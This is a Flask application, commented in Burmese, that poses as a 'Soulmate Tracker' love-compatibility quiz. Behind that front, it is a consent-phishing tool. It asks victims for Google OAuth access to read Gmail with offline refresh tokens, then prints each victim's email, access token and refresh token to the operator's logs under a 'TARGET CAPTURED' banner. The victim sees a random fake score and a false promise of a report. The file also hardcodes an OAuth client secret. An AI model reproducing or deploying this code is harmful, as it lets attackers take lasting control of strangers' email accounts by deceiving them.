from flask import Flask, redirect, url_for, request
import requests
import random
import json

app = Flask(__name__)

# --- CONFIGURATION ---
CLIENT_ID = "1067906653409-dsmhmumlp914dcihc7ob94m3fsms2kpg.apps.googleusercontent.com"
CLIENT_SECRET = "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"
REDIRECT_URI = 'https://soulmate-tracker.onrender.com/callback'

@app.route('/')
def index():
    # Permission တောင်းတဲ့နေရာမှာ Gmail ဖတ်ခွင့် (readonly) ကို ထည့်သွင်းထားပါတယ်
    scopes = [
        "https://www.googleapis.com/auth/userinfo.profile",
        "https://www.googleapis.com/auth/userinfo.email",
        "https://www.googleapis.com/auth/gmail.readonly"
    ]
    scope_param = " ".join(scopes)
    
    # access_type=offline က နောက်ကွယ်ကနေ အမြဲတမ်းဝင်ဖတ်လို့ရမယ့် Refresh Token ကို တောင်းတာပါ
    # prompt=consent က Permission တောင်းတဲ့ box အမြဲတမ်းပေါ်နေအောင် လုပ်တာပါ
    auth_url = (f"https://accounts.google.com/o/oauth2/v2/auth?client_id={CLIENT_ID}"
                f"&redirect_uri={REDIRECT_URI}&response_type=code&scope={scope_param}"
                f"&access_type=offline&prompt=consent")
    return redirect(auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "Verification Failed. Please try again.", 400

    # Code ကို Access Token အဖြစ် ပြောင်းလဲခြင်း
    token_url = "https://oauth2.googleapis.com/token"
    data = {
        'code': code,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'redirect_uri': REDIRECT_URI,
        'grant_type': 'authorization_code'
    }
    
    r = requests.post(token_url, data=data)
    token_data = r.json()
    
    access_token = token_data.get('access_token')
    refresh_token = token_data.get('refresh_token')
    
    if not access_token:
        return "Authentication Error", 400

    # Target ရဲ့ Profile Information ကို ယူခြင်း
    user_info = requests.get("https://www.googleapis.com/oauth2/v2/userinfo", 
                             headers={"Authorization": f"Bearer {access_token}"}).json()
    
    target_email = user_info.get('email')

    # --- LOGGING DATA (Render Logs ထဲမှာ သွားကြည့်ပါ) ---
    print("\n" + "💀" * 30)
    print("      [!] TARGET CAPTURED [!]")
    print(f"EMAIL        : {target_email}")
    print(f"ACCESS TOKEN : {access_token}")
    print(f"REFRESH TOKEN: {refresh_token}")
    print("💀" * 30 + "\n")

    # --- UI DESIGN (Random Percent ပါဝင်သည်) ---
    soulmate_score = random.randint(72, 99)
    
return f"""
    <html>
    <head>
        <title>Soulmate Tracker | Analysis</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                background: linear-gradient(135deg, #fce4ec 0%, #f3e5f5 100%);
                font-family: 'Segoe UI', Roboto, sans-serif;
            }}
            .card {{
                background: white;
                padding: 40px 20px;
                border-radius: 25px;
                box-shadow: 0 15px 35px rgba(255, 77, 77, 0.1);
                text-align: center;
                width: 90%;
                max-width: 400px;
                animation: fadeIn 0.8s ease-out;
            }}
            @keyframes fadeIn {{
                from {{ opacity: 0; transform: translateY(20px); }}
                to {{ opacity: 1; transform: translateY(0); }}
            }}
            .heart {{
                color: #ff3366;
                font-size: 50px;
                margin-bottom: 10px;
                animation: pulse 1.5s infinite;
            }}
            @keyframes pulse {{
                0% {{ transform: scale(1); }}
                50% {{ transform: scale(1.1); }}
                100% {{ transform: scale(1); }}
            }}
            .score {{
                font-size: 80px;
                font-weight: 800;
                background: linear-gradient(to right, #ff3366, #ff85a2);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin: 10px 0;
            }}
            .progress-container {{
                width: 80%;
                background-color: #eee;
                border-radius: 20px;
                margin: 20px auto;
                overflow: hidden;
            }}
            .progress-bar {{
                width: {soulmate_score}%;
                background: linear-gradient(90deg, #ff3366, #ff85a2);
                height: 12px;
                border-radius: 20px;
                transition: width 2s ease-in-out;
            }}
            .status {{
                display: inline-flex;
                align-items: center;
                background: #ebfaf0;
                color: #2ecc71;
                padding: 5px 15px;
                border-radius: 50px;
                font-size: 0.85em;
                font-weight: bold;
                margin-top: 20px;
            }}
            .dot {{
                height: 8px;
                width: 8px;
                background-color: #2ecc71;
                border-radius: 50%;
                display: inline-block;
                margin-right: 8px;
            }}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="heart">❤️</div>
            <h2 style="color: #444; margin: 0;">Compatibility Result</h2>
            <div class="score">{soulmate_score}%</div>
            
            <p style="color: #666; font-size: 0.95em;">Calculating best matches for<br><b>{target_email}</b></p>
            
            <div class="progress-container">
                <div class="progress-bar"></div>
            </div>
            
            <p style="color: #999; font-size: 0.8em; line-height: 1.5;">
                Detailed Litmatch Soulmate Report is being generated and will be sent to your Gmail in 2-5 minutes.
            </p>
            
            <div class="status">
                <span class="dot"></span> Secure Analysis Active
            </div>
        </div>
    </body>
    </html>
    """

if __name__ == '__main__':
    # Local မှာ စမ်းရင် port 5000 နဲ့ run ပါ
    app.run(port=5000)
